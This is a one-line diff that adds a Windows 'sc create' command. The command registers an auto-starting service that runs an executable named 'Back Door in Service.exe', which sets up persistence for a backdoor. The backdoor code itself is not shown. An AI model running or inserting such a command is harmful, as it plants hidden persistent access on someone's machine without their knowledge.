@@ -1,0 +1,1 @@
+sc create ServTest binpath= .\Back Door in Service\Debug\Back Door in Service.exe start= auto
